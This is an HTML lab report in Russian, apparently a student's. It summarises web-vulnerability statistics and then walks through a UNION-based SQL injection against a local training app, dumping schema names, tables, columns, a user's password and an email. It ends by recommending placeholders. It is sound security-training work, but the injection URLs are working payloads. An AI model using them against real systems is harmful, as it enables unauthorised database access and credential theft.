@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Отчёт по лабораторной работе №1</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; line-height: 1.6; }
+        h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
+        h2 { color: #34495e; margin-top: 30px; }
+        h3 { color: #7f8c8d; }
+        table { width: 100%; margin: 15px 0; }
+        th { background: #3498db; color: white; text-align: left; }
+        tr:nth-child(even) { background: #f8f9fa; }
+        a { color: #3498db; }
+        code { background: #ecf0f1; padding: 2px 6px; border-radius: 4px; }
+        hr { margin: 30px 0; border: none; border-top: 1px solid #ddd; }
+    </style>
+</head>
+<body>
+<h1>Веб уязвимости и SQL-инъекции</h1>
+<br>
+<h1>Часть 1. Статистика атак через веб-уязвимости</h1>
+<br>
+<h2>Ссылки на источники</h2>
+<br>
+<ul>
+<li>https://keepnetlabs.com/blog/2025-verizon-data-breach-investigations-report - Verizon DBIR 2025</li>
+<li>https://owasp.org/Top10/2025/ — OWASP Top 10 2025</li>
+<li>https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/#id5 - Positive Technologies 2025</li>
+<li>https://securelist.com/vulnerability-exploit-report-q2-2024/113455/ - Лаборатория Касперского, уязвимости Q2 2024</li>
+<li>https://securelist.com/top-10-web-app-vulnerabilities/112144/ - Лаборатория Касперского, топ-10 веб-уязвимостей</li>
+</ul>
+<br>
+<p>По <strong>Positive Technologies</strong> в <strong>31%</strong> случаев успешных атак на организации использовалась эксплуатация уязвимостей.</p>
+<br>
+<p>По <strong>Лаборатории Касперского</strong> в 2024 году <strong>39,2%</strong> атак на бизнес было связано с эксплуатацией уязвимостей в общедоступных приложениях. <strong>43%</strong> продвинутых кибератак на российский бизнес связаны с веб приложениями. Топ веб уязвимости: Broken Access Control, Sensitive Data Exposure, XSS, SSRF, Broken Authentication.</p>
+<br>
+<p>По <strong>Verizon DBIR</strong> по всему миру <strong>20%</strong> всех веб атак связаны с эксплуатацией уязвимостей. Доля веб атак по всем кибератакам <strong>12%</strong>. По отраслям: <strong>21%</strong> госучреждения, <strong>13%</strong> промышленность, <strong>6%</strong> IT-компании, <strong>6%</strong> медучреждения и тд. Всего <strong>52%</strong> успешных атак на организации.</p>
+<br>
+<h3>Часто встречающиеся веб уязвимости по Positive Technologies</h3>
+<br>
+<ul>
+<li>удалённое выполнение кода (RCE)</li>
+<li>подмена запросов на стороне сервера (SSRF)</li>
+<li>CRLF Injection</li>
+<li>удалённое выполнение кода и обход аутентификации</li>
+<li>чтение произвольных файлов</li>
+<li>переполнение кучи или стека</li>
+</ul>
+<br>
+<h3>OWASP Top 10 2025</h3>
+<br>
+<p><em>AIR</em> — средняя доля уязвимостей среди всех найденных, <em>AC</em> — доля приложений где найдена хотя бы одна уязвимость этой категории.</p>
+<br>
+<ul>
+<li>Broken Access Control — AIR 3,74%, AC 42,93%.</li>
+<li>Security Misconfiguration — AIR 3%, AC 52,35%.</li>
+<li>Software Supply Chain Failures — AIR 5,72%, AC 27,47%.</li>
+<li>Cryptographic Failures — AIR 3,8%, AC 47,74%.</li>
+<li>Injection — AIR 3,08%, AC 42,93%.</li>
+<li>Insecure Design — AIR 1,86%, AC 35,18%.</li>
+<li>Authentication Failures — AIR 2,92%, AC 37,14%.</li>
+<li>Software or Data Integrity Failures — AIR 2,75%, AC 45,49%.</li>
+<li>Security Logging and Alerting Failures — AIR 3,91%, AC 46,48%.</li>
+<li>Mishandling of Exceptional Conditions — AIR 2,95%, AC 37,95%.</li>
+</ul>
+<br>
+<hr>
+<br>
+<h1>Часть 2. Sql инъекция</h1>
+<br>
+<ol>
+<li>Зашел на локалхост, дошел до момента ввода айди по url. <strong>Команда:</strong> <strong>?id=1</strong>. Ввел в url — вывелся юзер с логином <strong>admin</strong>.</li>
+</ol>
+<br>
+<ol>
+<li>Попытался ввести свой айди — <strong>1234567</strong> — ничего не выдала -> <strong>Вывод:</strong> база статичная (была мысль что надо ввести айди чтобы он записался в бд, но нет, это просто запросы).</li>
+</ol>
+<br>
+<ol>
+<li>Скорее всего айди подставляется в запрос примерно так <strong>where id = 'input'</strong> попробую ввести. <strong>Команда:</strong> <strong>?id=1'</strong> — You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1. <strong>Вывод:</strong> ввод вставляется в запрос просто строкой, а не параметром (типа плейсхолдера в запросе) тк у нас ошибка что два ''.</li>
+</ol>
+<br>
+<ol>
+<li><strong>Команда:</strong> <strong>http://localhost:8080/task/?id=-1%27+UNION+SELECT+1,2+--+</strong> то есть объединяем вывод первый со вторым нужным — первый вывод пустой+добавили закрывающую ', но надо угадать кол-во колонок в Селекте. Получилось что их <strong>3</strong>: <strong>Вывод:</strong> Ваш id:1 Ваш логин:2. То есть в айди и логин подставляются первые два параметра селекта. ' в url преобразуется в <strong>%27</strong> автоматически.</li>
+</ol>
+<br>
+<p><strong>Вывод:</strong> The used SELECT statements have a different number of columns — когда пытался вывести меньше трех колонок в селекте.</p>
+<br>
+<ol>
+<li>Попробуем определить все имена баз данных с помощью <strong>information_schema</strong></li>
+</ol>
+<br>
+<p><strong>Команда:</strong> <strong>http://localhost:8080/task/?id=-1'+UNION+SELECT+1,GROUP_CONCAT(schema_name),3+FROM+information_schema.schemata%20--%20</strong></p>
+<br>
+<p><strong>Вывод:</strong> Ваш id:1 Ваш логин:information_schema,mysql,performance_schema,security,sys</p>
+<br>
+<p>базы данных — information_schema, mysql, performance_schema, security, sys.</p>
+<br>
+<ol>
+<li>Скорее всего нам нужна бд <strong>security</strong>.</li>
+</ol>
+<p>	пробелы заменяются на <strong>%20</strong> в адресной строке а ' на <strong>%27</strong>, почему то иногда + не заменяются на пробелы, но тоже можно использовать в качестве разделителя.</p>
+<br>
+<p><strong>Команда:</strong> <strong>http://localhost:8080/task/?id=-1%27+UNION+SELECT+1,GROUP_CONCAT(table_name),3+FROM+information_schema.tables+WHERE+table_schema=%27security%27%20--%20</strong></p>
+<br>
+<p><strong>Вывод:</strong> Ваш id:1 Ваш логин:emails,users</p>
+<br>
+<ol>
+<li>Узнаем информацию о юзерах, аналогично выведем колонки.</li>
+</ol>
+<br>
+<p><strong>Команда:</strong> <strong>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27%20AND%20table_schema=%27security%27%20--%20</strong></p>
+<br>
+<p><strong>Вывод:</strong> Ваш id:1 Ваш логин:id,username,password</p>
+<br>
+<p>Без второго условия на принаделжность к бд:</p>
+<br>
+<p><strong>Вывод:</strong> Ваш id:1 Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
+<br>
+<p><strong>Вывод:</strong> В целом можно догадаться какие колонки выбрать, но лучше искать из конкретной бд.</p>
+<br>
+<ol>
+<li>Аналогично с почтой.</li>
+</ol>
+<br>
+<p><strong>Вывод:</strong> Ваш id:1 Ваш логин:id,email_id</p>
+<br>
+<ol>
+<li>Просто выведем условие на нужного юзера + выведем айди тк он пригодится в дальнейшем:</li>
+</ol>
+<br>
+<p><strong>Команда:</strong> <strong>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20id,password,3%20FROM%20users%20WHERE%20username=%27Volk2%27+--+</strong></p>
+<br>
+<p><strong>Вывод:</strong> Ваш id:9 Ваш логин:Wa spoiuuuuu</p>
+<br>
+<p><strong>Команда:</strong> <strong>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20id,2,3%20FROM%20users%20WHERE%20username=%27Vinni-pukh%27+--+</strong></p>
+<br>
+<p><strong>Вывод:</strong> Ваш id:4 Ваш логин:2</p>
+<br>
+<p>Для винни пуха нам не нужен пароль поэтому выведем просто айди для почты — айди <strong>4</strong>.</p>
+<br>
+<ol>
+<li>По айди найдем почту.</li>
+</ol>
+<br>
+<p><strong>Команда:</strong> <strong>http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20id,email_id,3%20FROM%20emails%20WHERE%20id=4+--+</strong></p>
+<br>
+<p><strong>Вывод:</strong> Ваш id:4 Ваш логин:honey_lover@otus-lab.com</p>
+<br>
+<h3>В итоге пароль юзера: <strong>Wa spoiuuuuu</strong>, а почта винни пуха: <strong>honey_lover@otus-lab.com</strong></h3>
+<br>
+<h2><strong>Вывод:</strong> надо использовать плейсхолдеры и подставлять ввод юзера не прямо в скл строковый запрос</h2>
+<br>
+</body>
+</html>
